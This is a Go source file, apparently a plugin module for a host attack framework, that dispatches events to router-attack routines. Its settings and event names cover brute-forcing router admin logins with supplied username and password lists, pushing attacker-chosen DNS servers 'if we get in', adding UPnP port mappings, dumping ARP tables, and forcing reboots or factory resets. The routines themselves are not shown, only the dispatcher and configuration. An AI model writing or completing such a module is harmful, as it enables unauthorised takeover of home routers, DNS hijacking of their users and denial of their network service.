package main

import (
	"encoding/json"
	"sync"
)

var (
	sendMu sync.Mutex
	sendFn func(event string, payload []byte)
	host   map[string]interface{}
)

func setSend(fn func(event string, payload []byte)) {
	sendMu.Lock()
	sendFn = fn
	sendMu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	sendMu.Lock()
	fn := sendFn
	sendMu.Unlock()
	if fn == nil {
		return
	}
	var raw []byte
	switch v := payload.(type) {
	case []byte:
		raw = v
	case nil:
		raw = nil
	default:
		raw, _ = json.Marshal(v)
	}
	fn(event, raw)
}

func handleInit(hostJSON []byte) error {
	if len(hostJSON) > 0 {
		_ = json.Unmarshal(hostJSON, &host)
	}
	sendEvent("status", map[string]interface{}{"state": "loaded"})
	return nil
}

func handleUnload() {
	sendEvent("status", map[string]interface{}{"state": "unloaded"})
}

// ---------------------------------------------------------------------------
// settings
// ---------------------------------------------------------------------------

type Settings struct {
	Gateway string   `json:"gateway"`
	// Credentials to try against the admin panel.
	Users    []string `json:"users"`
	Passwords []string `json:"passwords"`
	// Brand override; empty = auto-detect from the login page / server header.
	Brand string `json:"brand"`
	// DNS servers to push if we get in.
	DNS1 string `json:"dns1"`
	DNS2 string `json:"dns2"`
	// UPnP
	UPnPInternalIP   string `json:"upnpInternalIp"`
	UPnPInternalPort int    `json:"upnpInternalPort"`
	UPnPExternalPort int    `json:"upnpExternalPort"`
	UPnPProtocol     string `json:"upnpProtocol"`
	UPnPDescription  string `json:"upnpDescription"`
}

func handleEvent(event string, payload []byte) error {
	preflight()
	var s Settings
	if len(payload) > 0 {
		_ = json.Unmarshal(payload, &s)
	}

	switch event {
	case "ping":
		sendEvent("pong", nil)
	case "detect":
		go detectRouter(s)
	case "attack":
		go attackRouter(s)
	case "dump_arp":
		go dumpRouterARP(s)
	case "set_dns":
		go setDNS(s)
	case "upnp_map":
		go upnpMap(s)
	case "upnp_list":
		go upnpList(s)
	case "reboot":
		go rebootRouter(s)
	case "factory_reset":
		go factoryReset(s)
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown event: " + event})
	}
	return nil
}

// Required by cgo for -buildmode=c-shared.
func main() {}
